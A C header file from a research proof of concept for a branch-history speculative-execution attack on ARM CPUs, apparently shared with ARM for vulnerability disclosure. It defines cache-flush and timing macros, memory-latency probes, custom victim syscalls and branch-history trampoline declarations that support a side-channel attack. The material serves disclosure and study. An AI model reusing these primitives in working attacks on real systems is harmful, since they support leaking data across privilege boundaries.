/*
 * PoC Codes for Branch History Speculative Update Exploitation
 * 
 * Sunday, November 3rd 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#ifndef __UTILS_H__
#define __UTILS_H__

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <string.h>
#include "target.h"
#include "jit_snippets.h"

#define IB_RET_MEM_RANGE    16

#define RECV_INTERVAL       32
#define RECV_ROUNDS         8
#define RECV_MISPRED_TESTS  (RECV_ROUNDS * RECV_INTERVAL)

#define N_PROBES            8
#define N_EVICTS_PER_PROBE  BST_WAYS

#define BASE_BPU_MAINTAIN   VOIDPTR(0x6000000)
#define BASE_BHB_POPULATE   VOIDPTR(0x7000000)
#define BASE_RET_MEM        VOIDPTR(0xf00000)

#define OFFSET_BHB_POPULATE 0x000
#define OFFSET_BIASSCOPE_PROBES       {0x2000, 0x2080, 0x21c4, 0x2180, 0x2200, 0x2280, 0x234c, 0x2380}
#define OFFSET_PROBE_BPIALL 0x3f40

#define CUST_SYSCALL_BIASSCOPE_SEND 462
#define CUST_SYSCALL_BSE_VICTIM 464
#define CUST_SYSCALL_BHS_VICTIM 462
#define CUST_SYSCALL_ENABLE_PMU_EL0 463


#define JMP_TO(x) ((void (*)())(x))()
#define VOIDPTR(x) (void*)(x)
#define MACRO_TO_STR(x) #x

// TODO: Architecture-specific code, rewrite this when porting to x86 or other architectures!
#define MEM_FLUSH_DC_CIVAC(p) asm volatile("dc civac, %0" ::"r"(p));
#define FLUSH_TO_RAM_IBPTR() MEM_FLUSH_DC_CIVAC(&func_ptr)
#define FLUSH_TO_L2C_IBPTR()
#define FLUSH_TO_RAM_GADGET() asm volatile("ic ivau, %0\n dc civac, %0" ::"r"(&func1))
#define FLUSH_TO_L2C_GADGET() asm volatile("ic ivau, %0" ::"r"(&func1))
#define __NOP(x, rsh) asm volatile(".rept " MACRO_TO_STR(x>>rsh) "\n nop\n .endr")
#define NOP(x) __NOP(x, 0)
#define NOP_PADDING(x) __NOP(x, OPCODE_ADDR_ALIGN)
// return an address for an IB that leaves a footprint of dst='0b??'
#define RET_MEM_WRITE_IBHB(x) (tramp_ret + (x << PATH_FP_DST_LSH))
#define WAIT_ALL_OPS_RETIRE(x) \
            asm volatile("dsb sy");\
            asm volatile("isb");\
            NOP(x);
#define MEM_ACCESS(p) *(volatile unsigned char *)p

enum ALLOC_METHOD
{
    ALLOC_MALLOC,
    ALLOC_MMAP
};

typedef struct
{
    uint64_t mem_size;
    void *mem_addr;
    void *call_entry;
    enum ALLOC_METHOD alloc_method;
} jit_obj_t;

typedef struct
{
    void *ret_mem;
    jit_populate_bhb_4args_t trampoline;
    uint32_t *mem_trampoline_offsets;
    uint32_t bh_len;
    uint64_t param0, param1;
} BH_trampoline_obj_t;


static const uint64_t offset_probes[N_PROBES] = OFFSET_BIASSCOPE_PROBES;

void get_os_params();
uint32_t *prep_ret_mem(register void *base_addr, register uint64_t size, int interval, int offset, jit_obj_t *jit_obj);
uint32_t *prep_fp_offsets(register uint64_t fp_mask, register int64_t fp_bits, register uint8_t fp_lsh, register uint64_t length, jit_obj_t *jit_obj);
void* prep_aligned_snippets(void *base, uint64_t offset_align_src, void *snippet, uint64_t offset_align_snippet, uint64_t len_snippet, uint64_t n_consist_lsb, jit_obj_t *jit_mem);
uint64_t read_cycles();
uint64_t mem_access_time(register volatile void *p);
void test_mem_latency(uint8_t *probe_ptr, uint64_t rounds, uint64_t *cycles_fast, uint64_t *cycles_slow);
void populate_cbhb_no_inline(int n);

register uint64_t __tmp asm("x19");
register uint64_t __timer asm("x20");

/**
 * Populate the conditional BHB with a for-loop.
 * The history of conditional branches seems to be XOR'd to path history when updating or querying IB prediction.
 * Add an extra for-loop to keep it constant when CPU reaches BLR_pred.
*/
void inline __attribute__((always_inline)) populate_cbhb(int n)
{
    NOP_PADDING(64);
    for (register int j = 0; j < n; j++)
    {
        NOP_PADDING(64);
    }
    NOP_PADDING(64);
}

#endif